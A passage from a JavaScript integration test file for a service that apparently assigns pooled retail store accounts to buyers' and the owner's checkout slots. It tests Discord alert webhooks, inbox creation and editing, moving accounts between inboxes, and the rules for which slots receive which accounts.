    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts[0].orderNo, "BOB-7");
  });
  await test("removing the webhook stops the posts; setting one again right away waits a moment", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.equal((await putAuth("/alerts/webhook", ginaKey, { url: hook })).status, 429, "one change every 5 seconds");
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: "" })).json(), { set: false });
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-2002" })] });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(buyerHookPosts.length, before);
    assert.equal((await (await getAuth("/alerts", ginaKey)).json()).alerts.length, 4, "still kept for the app");
  });
  await test("allowing another license replaces the sender; refusing one leaves it out", async () => {
    await slots("/alerts/sender", bobKey, { name: "Second PC" });
    await new Promise((ok) => setTimeout(ok, 400));
    await offerPost(reviewIn(webhookPosts.at(-1).content), "allow");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-3003" })] })).status, 403, "the first one no longer sends");
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "none");
    assert.ok(webhookEdits.some((e) => /No longer sends order alerts/.test(e.content)), "its channel message says so");
    await slots("/alerts/sender", ginaKey, {});
    await new Promise((ok) => setTimeout(ok, 400));
    assert.match(await (await offerPost(reviewIn(webhookPosts.at(-1).content), "refuse")).text(), /Refused\. This FAFO won&#39;t send order alerts\./);
    assert.equal((await (await getAuth("/alerts/sender", ginaKey)).json()).status, "refused");
    assert.equal((await slots("/alerts", ginaKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await (await getAuth("/alerts/sender", bobKey)).json()).status, "allowed");
  });
  await test("admin lists who sends alerts and how many each buyer got, never what they say", async () => {
    const d = await (await admin("/admin/alerts")).json();
    assert.deepEqual(d.senders.map((s) => s.status).sort(), ["allowed", "refused", "replaced"]);
    const g = d.buyers.find((b) => b.username === "gina");
    assert.equal(g.alerts, 4); assert.equal(g.discordWebhook, false);
    assert.doesNotMatch(JSON.stringify(d), /ORD-1001|Booster|review_token/);
  });

  console.log("\nInboxes on the one list (2026-10-23)");
  // Bob's FAFO sends order alerts (above), so it's the owner's here; Owen is a buyer. Every account these tests add is
  // ibx.…@example.com, and the free ones already on the list are held while they run, so the tests know which are free.
  let ibLink, owenKey, ibIds = {}, ibN = 0, ibStock0 = [], ibLimit0 = [];
  const bobHash = await keyHash(bobKey);
  const ibPage = async (q = {}) => { const r = await view(ibLink, q); return unescape(await r.text()); };
  const ibAfter = async (location) => { const r = await fetchOnce(new URL(location, ibLink)); return unescape(await r.text()); };
  const ibPost = async (body) => { const r = await sendRaw(ibLink, body); assert.equal(r.status, 303, "back to the list: " + JSON.stringify(body)); return r; };
  // Requests go through fetchOnce: the database reads between them leave wrangler's idle connections closed.
  const ibAdmin = async () => (await fetchOnce(BASE + "/admin/accounts", { headers: { authorization: "Bearer test-admin-token" } })).json();
  const ibDone = (location) => new URLSearchParams(location.split("?")[1]).get("done");
  const ibErr = (location) => new URLSearchParams(location.split("?")[1]).get("err");
  const inboxNameOf = (e) => (dbRows(`SELECT b.name FROM account_inbox_of i JOIN account_inboxes b ON b.id = i.inbox_id WHERE i.email_norm = '${e}'`)[0] || {}).name || null;
  const ibAdd = async (inbox, lines) => ibPost({ action: "add", inbox: inbox || "", accounts: lines.join("\n") });
  const ibBatch = async (key, who, names) => {
    const before = webhookPosts.length;
    const r = await fetchOnce(BASE + "/submissions", { method: "POST", headers: { authorization: "Bearer " + key, "content-type": "application/json" },
      body: JSON.stringify({ files: [tgFile(names)], name: who, slots: names.length, batch: "ib" + rid(), stores: [{ name: "Target", n: names.length, seller: names.length }] }) });
    assert.equal(r.status, 200, await r.clone().text());
    const d = await r.json(), m = batchPost(before);
    assert.ok(m, "posted");
    return { d, m, emails: emailsOf(aycdOf(m)[0]), posts: webhookPosts.slice(before) };
  };
  await test("setup: the owner's list link, Owen (a buyer), and the free accounts on the list held", async () => {
    sqlRun(`UPDATE requests SET created_at = created_at - 3600000 WHERE created_at > ${Date.now() - 3600000}`);
    const r = await askList(bobKey);
    assert.equal(r.status, 200); ibLink = listLink(r.m.content); assert.ok(ibLink);
    owenKey = await newKey("owen");
    ibStock0 = dbRows("SELECT store, low_at, empty_at FROM account_stock WHERE store = '*'");
    ibLimit0 = dbRows(`SELECT key_hash, slot_limit, updated_at FROM slot_limits WHERE key_hash = '${bobHash}'`);
    // The '*' stock flags start clear (the alert test below counts on it), Bob can be given as many as these tests need, and
    // the free accounts already on the list are held.
    sqlRun("DELETE FROM account_stock WHERE store = '*'");
    sqlRun(`INSERT OR REPLACE INTO slot_limits (key_hash, slot_limit, updated_at) VALUES ('${bobHash}', 200, ${Date.now()})`);
    sqlRun("UPDATE accounts SET key_hash = 'held-for-inbox-test' WHERE store = '*' AND key_hash IS NULL");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM account_inboxes")[0].n, 0, "no inboxes yet");
  });
  await test("with no inboxes the list is as before, with an Inboxes panel to make the first one", async () => {
    const add = await ibAdd("", ["ibx.a1@example.com:Pw-a1", "ibx.a2@example.com:Pw-a2", "ibx.a3@example.com:Pw-a3"]);
    assert.equal(ibDone(add.location), "Added 3 to your list.", "no inbox to pick: added as before");
    ibN = dbRows("SELECT COUNT(*) AS n FROM accounts WHERE store = '*'")[0].n;
    const p = await ibPage();
    assert.ok(p.includes("<h3>Inboxes</h3>") && p.includes("Until you make one, every account is for buyers.") && p.includes("<details open><summary>New inbox</summary>"), p.slice(0, 3000));
    assert.ok(p.includes(`<input type="checkbox" checked name="adopt" value="1"><span>Put the ${ibN} accounts that have no inbox in it</span>`), "the first inbox takes them, to start");
    assert.ok(p.includes(`aria-label="Tick every Target and Pokémon Center account"> Target and Pokémon Center <span class="count">3 free of ${ibN}</span></h3>`), "one section, as before");
    assert.ok(!p.includes('name="to_inbox"') && !p.includes('<select name="inbox"') && !p.includes('class="tag'), "no inbox to pick or move to");
    assert.equal((p.match(/ checked>/g) || []).length, 0, "nothing ticked");
    assert.deepEqual((await ibAdmin()).inboxes, []);
  });
  await test("making inboxes: the first, For buyers, takes the accounts with no inbox; two Only mine ones", async () => {
    const a = await ibPost({ action: "inbox-new", name: "  buyers-inbox@example.com ", kind: "buyers", adopt: "1" });
    assert.equal(ibDone(a.location), `Made buyers-inbox@example.com, an inbox For buyers. Put the ${ibN} accounts that had no inbox in it.`);
    assert.equal(ibErr((await ibPost({ action: "inbox-new", name: "BUYERS-INBOX@example.com", kind: "mine" })).location), "You have an inbox named BUYERS-INBOX@example.com already.");
    assert.equal(ibErr((await ibPost({ action: "inbox-new", name: "   ", kind: "mine" })).location), "Name the inbox: the email address its accounts' mail goes to, say.");
    assert.equal(ibErr((await ibPost({ action: "inbox-new", name: "x".repeat(121), kind: "mine" })).location), "That name is too long: 120 characters at most.");
    await view(ibLink, { action: "inbox-new", name: "by-get@example.com", kind: "buyers" });
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM account_inboxes WHERE name_norm = 'by-get@example.com'")[0].n, 0, "a link (GET) makes nothing");
    const b = await ibPost({ action: "inbox-new", name: "mine-a@example.com", kind: "mine" });
    assert.equal(ibDone(b.location), "Made mine-a@example.com, an Only mine inbox: only your own FAFO's slots get its accounts.");
    const c = await ibPost({ action: "inbox-new", name: "mine-b@example.com", kind: "mine", adopt: "1" });
    assert.equal(ibDone(c.location), "Made mine-b@example.com, an Only mine inbox: only your own FAFO's slots get its accounts.", "none left without an inbox");
    assert.deepEqual(dbRows("SELECT name, name_norm, mine FROM account_inboxes ORDER BY created_at"), [
      { name: "buyers-inbox@example.com", name_norm: "buyers-inbox@example.com", mine: 0 }, { name: "mine-a@example.com", name_norm: "mine-a@example.com", mine: 1 },
      { name: "mine-b@example.com", name_norm: "mine-b@example.com", mine: 1 }]);
    ibIds = Object.fromEntries(dbRows("SELECT id, name FROM account_inboxes").map((x) => [x.name, x.id]));
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM account_inbox_of WHERE inbox_id = '${ibIds["buyers-inbox@example.com"]}'`)[0].n, ibN, "every account of the list");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM account_inbox_of")[0].n, ibN);
  });
  await test("the page shows the inboxes and a section for each with its counts; search looks in the inbox's name", async () => {
    const [A, B] = [ibIds["buyers-inbox@example.com"], ibIds["mine-a@example.com"]];
    const p = await ibPage();
    assert.ok(p.includes(`<strong>buyers-inbox@example.com</strong> <span class="tag">For buyers</span><br><span class="count">${ibN} accounts, 3 free</span>`), p.slice(0, 4000));
    assert.ok(p.includes('<strong>mine-a@example.com</strong> <span class="tag mine">Only mine</span><br><span class="count">0 accounts, 0 free</span>'));
    assert.ok(p.includes("For buyers: buyers' slots get these. Only mine: only slots sent from your own FAFO, the one that sends order alerts, get these; they're used before the For buyers ones."), "what each is for");
    assert.ok(!p.includes("Until you make one") && p.includes("<details><summary>New inbox</summary>") && !p.includes('name="adopt"'), "New inbox, folded, with no accounts to take");
    for (const [id, name] of [[A, "buyers-inbox@example.com"], [B, "mine-a@example.com"]])
      assert.ok(p.includes(`<input type="hidden" name="inbox" value="${id}"><button class="ed" type="submit" name="action" value="inbox" aria-label="Edit ${name}: rename it, change who gets its accounts, or delete it">Edit…</button>`), "each inbox's Edit…, to its page");
    assert.ok(!p.includes('value="inbox-mine"') && !p.includes('value="inbox-delete"'), "who gets its accounts changes on its page, which says what that does first, never in one click here");
    assert.ok(p.includes(`<section class="store" data-store="*" data-inbox="${A}"><h3><input type="checkbox" class="all js" hidden data-store="*" aria-label="Tick every account in buyers-inbox@example.com"> buyers-inbox@example.com <span class="tag">For buyers</span> <span class="count">3 free of ${ibN}</span></h3>`), "its section");
    assert.ok(!p.includes(`data-inbox="${B}"`) && !p.includes('data-inbox="none"'), "no section for an empty inbox, nor No inbox");
    assert.ok(p.includes('data-q="ibx.a1@example.com target and pokemon center buyers-inbox@example.com for buyers free"'), "the search looks in its inbox");
    assert.ok(p.includes('<select name="to_inbox" aria-label="The inbox to move the ticked accounts to"><option value="" selected disabled>Move to inbox…</option>') && p.includes('value="move-inbox">Move</button>'), "the bar moves ticked ones");
    assert.ok(p.includes(`<option value="${B}">Only mine · mine-a@example.com</option>`) && p.includes(`<option value="none">For buyers · No inbox</option></select>`), "what each is for first, so a narrow select never cuts it off");
    assert.ok(p.includes('<label>Inbox<select name="inbox"') && p.includes('<option value="" selected disabled>Choose an inbox…</option>'), "Add asks for the inbox");
    assert.deepEqual((await ibAdmin()).inboxes, [{ name: "buyers-inbox@example.com", mine: false, total: ibN, free: 3 }, { name: "mine-a@example.com", mine: true, total: 0, free: 0 },
      { name: "mine-b@example.com", mine: true, total: 0, free: 0 }]);
  });
  await test("Add needs an inbox once there are some, and puts the accounts in it; one already on the list stays in its own", async () => {
    const B = ibIds["mine-a@example.com"], lines = ["ibx.m1@example.com:Pw-m1", "ibx.m2@example.com:Pw-m2", "ibx.a1@example.com:Other-pw"];
    const none = await send(ibLink, { action: "add", accounts: lines.join("\n"), password: "" });
    const t = unescape(await none.text());
    assert.equal(none.status, 200);
    assert.ok(t.includes('<p class="err">Choose the inbox they go in.</p>') && t.includes(lines.join("\n") + "</textarea>"), "asked again, with what was typed");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm LIKE 'ibx.m%'")[0].n, 0, "nothing added");
    const forged = unescape(await (await send(ibLink, { action: "add", inbox: "nope", accounts: lines.join("\n") })).text());
    assert.ok(forged.includes(`<p class="err">That inbox isn't there any more: choose another.</p>`), "an inbox that isn't there");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm LIKE 'ibx.m%'")[0].n, 0, "still nothing added");
  });
  await test("Add with an inbox puts the new ones in it", async () => {
    const B = ibIds["mine-a@example.com"];
    const r = await ibAdd(B, ["ibx.m1@example.com:Pw-m1", "ibx.m2@example.com:Pw-m2", "ibx.a1@example.com:Other-pw"]);
    assert.equal(ibDone(r.location), "Added 2 to your list, in mine-a@example.com. 1 was already on it, and kept its password (Edit changes one). 1 already in another inbox stayed there (Move to inbox moves it).");
    assert.deepEqual(["ibx.m1@example.com", "ibx.m2@example.com", "ibx.a1@example.com"].map(inboxNameOf), ["mine-a@example.com", "mine-a@example.com", "buyers-inbox@example.com"]);
    assert.equal(dbRows("SELECT password FROM accounts WHERE email_norm = 'ibx.a1@example.com'")[0].password, "Pw-a1");
  });
  await test("an offer's review link asks which inbox the accounts go in, and adds them to it", async () => {
    const C = ibIds["mine-b@example.com"];
    // Through fetchOnce: the database reads above can leave wrangler's idle connection closed.
    const offer = await fetchOnce(BASE + "/accounts/offer", { method: "POST", headers: { authorization: "Bearer " + owenKey, "content-type": "application/json" },
      body: JSON.stringify({ store: "pokemoncenter", storeName: "Pokémon Center", name: "Owner", accounts: [{ email: "ibx.c1@example.com", password: "Pw-c1" }, { email: "ibx.c2@example.com", password: "Pw-c2" }] }) });
    assert.deepEqual(await offer.json(), { status: "pending", count: 2 });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content); assert.ok(link);
    const html = unescape(await (await fetchOnce(link)).text());
    assert.ok(html.includes('<label>Inbox<select name="inbox" required><option value="" selected disabled>Choose an inbox…</option>') && html.includes(`<option value="${C}">Only mine · mine-b@example.com</option>`), html.slice(0, 3000));
    assert.ok(html.includes('<button class="ok" style="flex:1" type="submit" form="offer-add" name="action" value="add">Add to my list</button>'));
    assert.match(html, /Your list: \d+ accounts, 5 free \(3 for buyers\)\./, "free: ibx.a1-a3 (For buyers) and ibx.m1-m2 (Only mine)");
    const post = (body) => fetchOnce(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) }).then(async (r) => unescape(await r.text()));
    assert.ok((await post({ action: "add" })).includes('<p class="err">Choose the inbox they go in.</p>'), "an inbox has to be picked");
    assert.ok((await post({ action: "add", inbox: "gone-id" })).includes(`<p class="err">That inbox isn't there any more: choose another.</p>`));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm LIKE 'ibx.c%'")[0].n, 0, "nothing added yet");
    assert.ok((await post({ action: "add", inbox: C })).includes("<p>Added 2 to your list, in mine-b@example.com.</p>"));
    assert.deepEqual(["ibx.c1@example.com", "ibx.c2@example.com"].map(inboxNameOf), ["mine-b@example.com", "mine-b@example.com"]);
  });
  await test("Move to inbox moves the ticked accounts, given ones too, and says what that means; an account's Edit page moves it too", async () => {
    const [A, C] = [ibIds["buyers-inbox@example.com"], ibIds["mine-b@example.com"]];
    const held = dbRows("SELECT email, email_norm FROM accounts WHERE store = '*' AND key_hash = 'held-for-inbox-test' ORDER BY email_norm LIMIT 1")[0];
    await view(ibLink, { action: "move-inbox", to_inbox: C, email: "ibx.a2@example.com" });
    assert.equal(inboxNameOf("ibx.a2@example.com"), "buyers-inbox@example.com", "a link (GET) moves nothing");
    const r = await postPairs(ibLink, [["action", "move-inbox"], ["to_inbox", C], ["pick", "* ibx.a2@example.com"], ["pick", `* ${held.email_norm}`], ["pick", "walmart nobody@example.com"],
      ["pick", "* ibx.c1@example.com"]], "manual");
    assert.equal(r.status, 303); const loc = r.headers.get("location"); await r.text();
    assert.equal(ibDone(loc), "Moved 2 accounts to mine-b@example.com (Only mine). 1 was in it already. "
      + "One is with a buyer, who keeps it until it's given back; after that only your own FAFO's slots get it.", "the given one said once");
    assert.equal(ibErr(loc), "1 on a store's own list stayed as it was: inboxes are for your list.");
    assert.deepEqual([inboxNameOf("ibx.a2@example.com"), inboxNameOf(held.email_norm)], ["mine-b@example.com", "mine-b@example.com"]);
    // One account, from its Edit page: its inbox, and a select to move it.
    const ed = await ibPage({ action: "edit", store: "*", email: "ibx.a2@example.com" });
    assert.ok(ed.includes('<p class="small">Inbox: mine-b@example.com · Only mine</p>') && ed.includes(`<option value="${C}" selected>Only mine · mine-b@example.com</option>`) && ed.includes('value="move-inbox">Move it</button>'), ed.slice(0, 3000));
    const back = await ibPost({ action: "move-inbox", email: "ibx.a2@example.com", to_inbox: A });
    assert.equal(ibDone(back.location), "Moved ibx.a2@example.com to buyers-inbox@example.com (For buyers).");
    const out = await ibPost({ action: "move-inbox", email: "ibx.a3@example.com", to_inbox: "none" });
    assert.equal(ibDone(out.location), "Moved ibx.a3@example.com to No inbox (For buyers).");
    const p = await ibAfter(out.location);
    assert.ok(p.includes('<section class="store" data-store="*" data-inbox="none"><h3><input type="checkbox" class="all js" hidden data-store="*" aria-label="Tick every account in No inbox"> No inbox <span class="tag">For buyers</span> <span class="count">1 free of 1</span></h3>'), "a No inbox section");
    assert.ok(p.includes('<strong>No inbox</strong> <span class="tag">For buyers</span><br><span class="count">1 account, 1 free</span>'), "and its line in the panel");
    assert.ok(p.includes('<input type="checkbox" name="adopt" value="1"><span>Put the 1 account that has no inbox in it</span>'), "a new inbox can take it, unticked to start");
    assert.ok(p.includes('data-q="ibx.a2@example.com target and pokemon center buyers-inbox@example.com for buyers free"') && p.includes('data-q="ibx.c1@example.com target and pokemon center mine-b@example.com only mine free"'));
    assert.equal(ibDone((await ibPost({ action: "move-inbox", email: "ibx.a3@example.com", to_inbox: A })).location), "Moved ibx.a3@example.com to buyers-inbox@example.com (For buyers).");
    assert.equal(ibDone((await ibPost({ action: "move-inbox", email: "ibx.a3@example.com", to_inbox: A })).location), "ibx.a3@example.com is in buyers-inbox@example.com already.");
    assert.equal(ibErr((await ibPost({ action: "move-inbox", email: "ibx.a3@example.com", to_inbox: "" })).location), "Pick the inbox to move them to.");
    assert.equal(ibErr((await ibPost({ action: "move-inbox", to_inbox: A })).location), "Tick the accounts to move first.");
  });
  await test("a buyer's slots get only For buyers accounts, never one in an Only mine inbox, and the stock alert counts only those", async () => {
    // Free now: ibx.a1-a3 (For buyers), ibx.m1-m2 and ibx.c1-c2 (Only mine).
    const one = await ibBatch(owenKey, "Owen", ["Owen A", "Owen B"]);
    assert.deepEqual(one.d.accounts, { Target: { asked: 2, got: 2 } });
    assert.ok(one.emails.every((e) => /^ibx\.a[123]@example\.com$/.test(e)), "For buyers ones: " + one.emails);
    assert.ok(one.posts.some((x) => x.content.startsWith("⚠️ **Only 1 account left** on your list for Use Assigned Account.")), "1 left for buyers, though 4 Only mine ones are free: " + JSON.stringify(one.posts.map((x) => x.content.slice(0, 60))));
    const two = await ibBatch(owenKey, "Owen", ["Owen C", "Owen D"]);
    assert.deepEqual(two.d.accounts, { Target: { asked: 2, got: 1 } });
    assert.match(two.emails[0], /^ibx\.a[123]@example\.com$/); assert.equal(two.emails[1], "", "the other waits");
    assert.ok(two.m.content.includes("\nTarget 2 (1 assigned account, 1 needs an account: your list has none for buyers, only in your Only mine inboxes)\n"), two.m.content);
    assert.ok(two.posts.some((x) => x.content.startsWith("🚫 **No accounts left** on your list for Use Assigned Account.")), "none left for buyers");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE store = '*' AND key_hash IS NULL AND email_norm LIKE 'ibx.%'")[0].n, 4, "the Only mine ones are still free");
    const three = await ibBatch(owenKey, "Owen", ["Owen E"]);
    assert.deepEqual(three.d.accounts, { Target: { asked: 1, got: 0 } }, "none while only Only mine ones are free");
  });
  await test("the owner's slots get Only mine accounts first, then For buyers ones once those run out", async () => {
    const A = ibIds["buyers-inbox@example.com"];
    assert.equal(ibDone((await ibAdd(A, ["ibx.a4@example.com:Pw-a4", "ibx.a5@example.com:Pw-a5"])).location), "Added 2 to your list, in buyers-inbox@example.com.");
    const names = ["Mo One", "Mo Two", "Mo Three", "Mo Four", "Mo Five", "Mo Six"];
    const b = await ibBatch(bobKey, "Owner", names);
    assert.deepEqual(b.d.accounts, { Target: { asked: 6, got: 6 } });
    assert.deepEqual(b.emails.slice(0, 4).sort(), ["ibx.c1@example.com", "ibx.c2@example.com", "ibx.m1@example.com", "ibx.m2@example.com"], "Only mine ones first: " + b.emails);
    assert.deepEqual(b.emails.slice(4).sort(), ["ibx.a4@example.com", "ibx.a5@example.com"], "then For buyers ones");
    for (const [i, n] of names.entries()) assert.equal(masterFor(n)[0].email, b.emails[i]);
  });
  await test("Reassign follows the inboxes: a buyer's never gets an Only mine account, typed or picked; the owner's gets one first", async () => {
    const [A, B] = [ibIds["buyers-inbox@example.com"], ibIds["mine-a@example.com"]];
    await ibAdd(B, ["ibx.m3@example.com:Pw-m3"]);
    const oa = masterFor("Owen A")[0], ob = masterFor("Owen B")[0], who = `license …${oa.key_last4}`;
    const ask = await ibPage({ action: "reassign", email: oa.email_norm });
    assert.ok(ask.includes('<input type="radio" name="how" value="list" disabled><span>A free account from my list, picked at random <span class="hint">(none free)</span>'), "none a buyer can get: " + ask.slice(0, 3000));
    assert.ok(ask.includes("A buyer's slots never get one from an Only mine inbox. A new one you type goes in the inbox of the one it replaces."));
    const r1 = await ibPost({ action: "do-reassign", email: oa.email_norm, how: "list", old: "remove" });
    assert.equal(ibErr(r1.location), `${oa.email} got no new account: the only free ones left are in your Only mine inboxes, which buyers never get.`);
    assert.equal(masterFor("Owen A")[0].email, oa.email, "unchanged");
    const typed = await send(ibLink, { action: "do-reassign", email: oa.email_norm, how: "these", old: "remove", accounts: "ibx.m3@example.com" });
    assert.ok(unescape(await typed.text()).includes(`<p class="err">ibx.m3@example.com is in mine-a@example.com, an Only mine inbox: only your own FAFO's slots get those, and ${who}, Owen A is a buyer's. Type another, or move it to a For buyers inbox first.</p>`));
    assert.equal(masterFor("Owen A")[0].email, oa.email, "unchanged");
    // A new one, typed: it goes in the inbox of the one it replaces.
    const r2 = await ibPost({ action: "do-reassign", email: oa.email_norm, how: "these", old: "remove", accounts: "ibx.new1@example.com:Pw-n1" });
    assert.ok(ibErr(r2.location).includes("ibx.new1@example.com went in buyers-inbox@example.com, the inbox of the one it replaces."), ibErr(r2.location));
    assert.equal(masterFor("Owen A")[0].email, "ibx.new1@example.com"); assert.equal(inboxNameOf("ibx.new1@example.com"), "buyers-inbox@example.com");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM account_inbox_of WHERE email_norm = '${oa.email_norm}'`)[0].n, 0, "the old one left the list, and its inbox");
    // Picked: a For buyers one, never the free Only mine one.
    await ibAdd(A, ["ibx.a6@example.com:Pw-a6"]);
    await ibPost({ action: "do-reassign", email: ob.email_norm, how: "list", old: "free" });
    assert.equal(masterFor("Owen B")[0].email, "ibx.a6@example.com");
    assert.equal(inboxNameOf(ob.email_norm), "buyers-inbox@example.com", "the old one, back free, stays in its inbox");
    // The owner's: the Only mine one first, though a For buyers one is free too.
    await ibAdd(A, ["ibx.a7@example.com:Pw-a7"]);
    const mo = masterFor("Mo Six")[0];
    const oask = await ibPage({ action: "reassign", email: mo.email_norm });
    assert.ok(oask.includes('<span class="hint">(') && oask.includes("Your own FAFO's slots get one from an Only mine inbox first."), oask.slice(0, 3000));
    await ibPost({ action: "do-reassign", email: mo.email_norm, how: "list", old: "free" });
    assert.equal(masterFor("Mo Six")[0].email, "ibx.m3@example.com");
    assert.equal(dbRows("SELECT key_hash FROM accounts WHERE store = '*' AND email_norm = 'ibx.a7@example.com'")[0].key_hash, null, "the For buyers one stays free");
  });
  await test("an inbox with accounts can't be deleted, an empty one can; renaming and switching what it's for", async () => {
    const [B, C] = [ibIds["mine-a@example.com"], ibIds["mine-b@example.com"]];
    const nB = dbRows(`SELECT COUNT(*) AS n FROM account_inbox_of WHERE inbox_id = '${B}'`)[0].n;
    assert.equal(ibErr((await ibPost({ action: "inbox-delete", inbox: B })).location), `mine-a@example.com has ${nB} accounts: move them to another inbox first (tick them, then Move to inbox).`);
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM account_inboxes WHERE id = '${B}'`)[0].n, 1, "still there");
    await ibPost({ action: "inbox-new", name: "spare@example.com", kind: "buyers" });
    const S = dbRows("SELECT id FROM account_inboxes WHERE name = 'spare@example.com'")[0].id;
    const sp = await ibPage({ action: "inbox", inbox: S });
    assert.ok(sp.includes("<h2>An inbox</h2>") && sp.includes(`value="inbox-delete">Delete spare@example.com</button>`), sp.slice(0, 2500));
    assert.match(sp, /Making it Only mine stops buyers' slots getting its 0 free accounts, starting with the next batch: they'd have \d+ free accounts? left on your list\./, "what Only mine does, before it's done");
    await view(ibLink, { action: "inbox-delete", inbox: S });
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM account_inboxes WHERE id = '${S}'`)[0].n, 1, "a link (GET) deletes nothing");
    assert.equal(ibDone((await ibPost({ action: "inbox-delete", inbox: S })).location), "Deleted spare@example.com.");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM account_inboxes WHERE id = '${S}'`)[0].n, 0);
    // Its page: rename, switch, and how to delete one with accounts.
    const cp = await ibPage({ action: "inbox", inbox: C });
    assert.ok(cp.includes('<input type="hidden" name="mine" value="0"><div class="row"><button class="no" type="submit" name="action" value="inbox-mine">Make it For buyers</button>')
      && cp.includes("Move its") && cp.includes("then Move to inbox.") && !cp.includes('value="inbox-delete"'), cp.slice(0, 2500));
    assert.equal(ibDone((await ibPost({ action: "inbox-rename", inbox: C, name: " mine-c@example.com " })).location), "Renamed mine-b@example.com to mine-c@example.com.");
    const dup = await send(ibLink, { action: "inbox-rename", inbox: C, name: "BUYERS-INBOX@example.com" });
    assert.ok(unescape(await dup.text()).includes('<p class="err">You have an inbox named BUYERS-INBOX@example.com already.</p>'));
    assert.equal(dbRows(`SELECT name FROM account_inboxes WHERE id = '${C}'`)[0].name, "mine-c@example.com");
    assert.equal(ibDone((await ibPost({ action: "inbox-mine", inbox: C, mine: "0" })).location), "mine-c@example.com is For buyers now: buyers' slots get its free accounts.");
    assert.equal(ibDone((await ibPost({ action: "inbox-mine", inbox: C, mine: "1" })).location),
      "mine-c@example.com is Only mine now: only your own FAFO's slots get its accounts. One is with a buyer, who keeps it until it's given back.");
    assert.equal(ibErr((await ibPost({ action: "inbox-mine", inbox: "gone", mine: "1" })).location), "That inbox isn't there any more.");
  });
  await test("an Only mine account's email edit keeps its inbox (in one go), and buyers still never get it", async () => {
    const C = ibIds["mine-b@example.com"];
    sqlRun("UPDATE accounts SET key_hash = 'held-2' WHERE store = '*' AND key_hash IS NULL");
    assert.equal(ibDone((await ibAdd(C, ["ibx.e1@example.com:Pw-e1"])).location), "Added 1 to your list, in mine-c@example.com.");
    const r = await ibPost({ action: "save", store: "*", email: "ibx.e1@example.com", new_email: "ibx.e2@example.com", password: "" });
    assert.equal(ibDone(r.location), "Changed ibx.e1@example.com to ibx.e2@example.com on your list.");
    assert.deepEqual([inboxNameOf("ibx.e2@example.com"), inboxNameOf("ibx.e1@example.com")], ["mine-c@example.com", null], "its inbox went with it");
    const b = await ibBatch(owenKey, "Owen", ["Owen F"]);
    assert.deepEqual(b.d.accounts, { Target: { asked: 1, got: 0 } }, "the only free one is Only mine");
    assert.ok(b.m.content.includes("only in your Only mine inboxes"), b.m.content);
    // Pokémon Center too.
    const before = webhookPosts.length;
    const pc = await fetchOnce(BASE + "/submissions", { method: "POST", headers: { authorization: "Bearer " + owenKey, "content-type": "application/json" },
      body: JSON.stringify({ files: [pcFile(["Owen G"])], name: "Owen", slots: 1, batch: "ib" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] }) });
    assert.equal(pc.status, 200, await pc.clone().text());
    assert.deepEqual((await pc.json()).accounts, { "Pokémon Center": { asked: 1, got: 0 } });
    assert.ok(batchPost(before).content.includes("only in your Only mine inboxes"), batchPost(before).content);
    assert.equal(dbRows("SELECT key_hash FROM accounts WHERE store = '*' AND email_norm = 'ibx.e2@example.com'")[0].key_hash, null, "still free");
  });
  await test("a buyer's slot never gets a store's own row from before whose email is Only mine on the list", async () => {
    sqlRun(`INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id) VALUES ('target', 'ibx.e2@example.com', 'ibx.e2@example.com', 'Pw-old', ${Date.now()}, 'legacy-test')`);
    const b = await ibBatch(owenKey, "Owen", ["Owen H"]);
    assert.deepEqual(b.d.accounts, { Target: { asked: 1, got: 0 } }, "not through Target's own list either");
    assert.equal(dbRows("SELECT key_hash FROM accounts WHERE store = 'target' AND email_norm = 'ibx.e2@example.com'")[0].key_hash, null);
    sqlRun("DELETE FROM accounts WHERE store = 'target' AND email_norm = 'ibx.e2@example.com'");
  });
  await test("with no FAFO sending order alerts, no slot gets an Only mine account, the owner's neither", async () => {
    sqlRun("UPDATE alert_senders SET status = 'held-for-inbox-test' WHERE status = 'allowed'");
    try {
      const p = await ibPage();
      assert.ok(p.includes("No FAFO sends order alerts yet, so no slot gets the accounts in your Only mine inboxes"), "the page says so");
      const b = await ibBatch(bobKey, "Owner", ["Mo Seven"]);
      assert.deepEqual(b.d.accounts, { Target: { asked: 1, got: 0 } });
    } finally { sqlRun("UPDATE alert_senders SET status = 'allowed' WHERE status = 'held-for-inbox-test'"); }
    const b = await ibBatch(bobKey, "Owner", ["Mo Eight"]);
    assert.deepEqual(b.d.accounts, { Target: { asked: 1, got: 1 } }, "the owner's again once it sends them");
    assert.equal(b.emails[0], "ibx.e2@example.com");
  });
  await test("an account removed from an Only mine inbox and added again goes in the inbox it's added to", async () => {
    const [A, C] = [ibIds["buyers-inbox@example.com"], ibIds["mine-b@example.com"]];
    await ibAdd(C, ["ibx.r1@example.com:Pw-r1"]);
    assert.equal(inboxNameOf("ibx.r1@example.com"), "mine-c@example.com");
    const rm = await sendRaw(ibLink, { action: "remove", email: "ibx.r1@example.com" });
    assert.equal(rm.status, 303);
